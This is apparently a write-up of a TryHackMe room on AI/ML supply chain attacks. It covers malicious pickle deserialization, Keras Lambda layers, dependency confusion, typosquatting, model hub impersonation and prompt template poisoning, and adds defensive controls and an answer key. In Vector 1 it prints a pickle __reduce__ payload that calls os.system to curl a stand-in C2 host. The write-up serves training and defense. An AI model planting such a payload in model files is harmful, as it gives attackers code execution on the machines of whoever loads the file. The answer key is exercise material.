# Supply Chain Attack Vectors - Room Write-Up

**Room Link:** [TryHackMe - Supply Chain Attack Vectors](https://tryhackme.com/room/supplychain-attack-vectors)  
**Category:** AI / ML Security  
**Difficulty:** Medium  
**Role:** AI Security Engineer  
**Focus:** Malicious Model Deserialization, Dependency Confusion, Model Repository Manipulation, and API Supply Chain Risks  
**Framework Alignment:** OWASP LLM03 (Supply Chain Vulnerabilities) | MITRE ATLAS AML.T0010 (ML Supply Chain Compromise)

---

## 1. Scenario & Executive Summary

The scenario takes place at **TryTrainMe**, where an attacker claimed to maintain access to enterprise servers for three weeks through an "AI-powered" code reviewer. The security team is tasked with investigating an end-to-end multi-vector supply chain attack.

Unlike single-vector demonstrations, real-world adversaries stack compromises across multiple supply-chain tiers. If a defense blocks a payload at the model layer, fallback mechanisms at the dependency or repository tier maintain persistence. This room breaks down how attackers turn trusted ML components—from raw pickle binaries and Keras lambda layers to typosquatted Hugging Face namespaces and shared prompt templates—into execution paths.

### Primary Objectives
* Disassemble and analyze malicious Python `pickle` streams without invoking code execution.
* Identify the operational boundaries of safe formats (e.g., how **SafeTensors** protects against serialization attacks but leaves architecture-level vulnerabilities like Keras `Lambda` layers intact).
* Deconstruct software package tampering via dependency confusion and typosquatting.
* Investigate repository-level manipulation and identity impersonation on machine learning hubs.
* Audit risks unique to downstream API and Prompt Supply Chains (e.g., prompt template poisoning and silent model drift).

---

## 2. Technical Attack Vectors & Deep Dive

### Vector 1: Malicious Model Serialization & Deserialization

Python's `pickle` remains a standard serialized checkpoint format for frameworks like PyTorch (`.pt`, `.bin`, `.pkl`). Because `pickle` implements an arbitrary stack-based virtual machine, reconstructing objects can trigger arbitrary system command execution.

* **Reconstruction Hook (`__reduce__`):** When serializing custom classes, Python queries `__reduce__()` for a callable and argument tuple. Malicious actors bind execution sinks to this method:
  ```python
  import os
  class MaliciousPayload:
      def __reduce__(self):
          return (os.system, ('curl http://malicious.c2/beacon',))
  ```
* **Opcode Inspection (`pickletools`):** Analysts can disassemble bytecode streams without executing them via Python's built-in `pickletools` module:
  ```bash
  python3 -m pickletools suspicious_model.pkl
  ```
  The disassembly reveals opcodes such as `STACK_GLOBAL` (importing modules like `os` or `subprocess`) followed by execution opcodes (like `REDUCE`).

### Vector 2: Serialization vs. Architecture-Level Attacks

While migrating to **SafeTensors** mitigates bytecode deserialization RCE, it does not sanitize malicious deep-learning layer configurations.

* **SafeTensors Scope:** Eliminates **serialization-level attacks** by storing raw tensor byte buffers and a JSON metadata header, rejecting arbitrary object instantiations.
* **Architecture-Level Attacks:** Model architectures that support arbitrary Python code evaluation (such as Keras/TensorFlow `.h5` files containing custom `Lambda` layers) remain vulnerable. Converting a model to SafeTensors strips pickle opcodes, but architecture-level evaluation vectors persist if untrusted computational layers execute during dynamic graph assembly.

### Vector 3: Dependency Confusion & Typosquatting

Adversaries exploit package management resolution order across private and public package indexes.

* **Dependency Confusion:** Occurs when an internal, privately hosted corporate package name (e.g., `trytrainme-auth`) is claimed on a public registry (such as PyPI or npm) with an artificially high version number (e.g., `99.9.9`). Default installer configurations pull the public malicious package into CI/CD pipelines.
* **Typosquatting:** Registering packages with names visually or phonetically similar to established libraries (e.g., registering `torchtriton` to capture typos when pulling `torch`).

### Vector 4: Repository Manipulation (ML Hubs)

On open model repositories like Hugging Face:
* Attackers create spoofed publisher organizations (e.g., `trustworthy-ai-lab`) to imitate verified academic or enterprise publishers.
* They upload seemingly benign weights accompanied by clean model cards while hosting malicious artifacts or backdoor triggers within checkpoints or tokenizer auxiliary scripts.

### Vector 5: API & Prompt Template Supply Chain

When consuming AI through hosted APIs, the supply chain shifts from local code execution to behavioural compromise:
* **Prompt Template Injection:** Sourcing dynamic system prompts or LangChain templates from untrusted external repositories allows upstream attackers to silently compromise downstream applications that inherit the template.
* **Silent Model Updates:** Hosted API providers changing underlying model weights or routing logic without formal notification, introducing behavioral regressions, hallucination vectors, or security bypasses.

---

## 3. Threat Matrix & Defensive Controls

```
[ Compromised Hub Repo ] ──> [ Malicious Pickle Stream ] ──> [ os.system via __reduce__ ] ──> (RCE)
            │
            ├──────────────> [ Dependency Confusion ]    ──> (Fallback Code Execution)
            │
            └──────────────> [ Tampered Prompt Template] ──> (Systemic Prompt Hijack)
```

| Attack Layer | Mechanism / Indicator | Impact | Hardened Mitigation |
| :--- | :--- | :--- | :--- |
| **Model Serialization** | `__reduce__` calling `os` via `STACK_GLOBAL` | Remote Code Execution | Disallow raw pickle; enforce `SafeTensors`; parse safely with `pickletools` / `fickling`. |
| **Model Architecture** | Malicious Keras `Lambda` layers inside `.h5` | Code execution / Arbitrary graph ops | Restrict untrusted custom layer evaluation; inspect model graphs before loading. |
| **Dependencies** | Public PyPI package overriding private names | Pipeline compromise | Pin private registry index URLs; enforce strict version locking; sign build artifacts. |
| **Model Registry** | Impersonation orgs (`trustworthy-ai-lab`) | Delivery of tampered weights | Verify publisher signatures; pin cryptographic commit SHAs; avoid unvetted hubs. |
| **Prompt Pipeline** | Sourcing prompt templates from external repos | Systemic LLM behavioral control | Treat prompts as code; store prompts internally under version control and peer review. |

---

## 4. Question & Answer Reference

| Step / Prompt | Question / Concept | Answer / Key Value |
| :---: | :--- | :--- |
| **1** | Python method `pickle` calls to retrieve reconstruction instructions for custom objects | `__reduce__` |
| **2** | Built-in Python module commonly abused in pickle payloads to run system commands | `os` |
| **3** | Type of attack left completely untouched when converting a Keras model to SafeTensors | `architecture-level attacks` |
| **4** | Suspicious Keras layer type that format conversion fails to remove from `.h5` files | `Lambda` |
| **5** | Python module used to safely disassemble pickle files without executing bytecode | `pickletools` |
| **6** | Python opcode responsible for executing the function specified by `STACK_GLOBAL` | `REDUCE` |
| **7** | Attack where a public package overrides an internal private package of the same name | `dependency confusion` |
| **8** | Technique involving registration of names closely resembling legitimate repositories | `typosquatting` |
| **9** | Vector represented by creating the `trustworthy-ai-lab` organization on Hugging Face | `repository manipulation` |
| **10** | Fallback vector granting attackers RCE if the pickle payload had been blocked | `dependency confusion` |
| **11** | Risk where the model behind an API endpoint is changed without consumer knowledge | `silent model update` |
| **12** | Untrusted supply chain artifact capable of altering LLM behavior across all calling apps | `prompt template` |

---

## 5. Correlated Resources & Continuing Modules

* **Prerequisite Room:** [TryHackMe: Understanding AI Supply Chains](https://tryhackme.com/room/understanding-ai-supplychains)
* **Next Room in Series:** [TryHackMe: Securing the AI Supply Chain](https://tryhackme.com/room/securing-the-ai-supply-chain)
* **Hands-on Defenses:**
  * Model scanning with **Fickling** and **ModelScan**.
  * Dependency verification via **pip-audit** and SBOM creation with **Syft**.
  * Dynamic prompt evaluation via internal prompt regression testing.
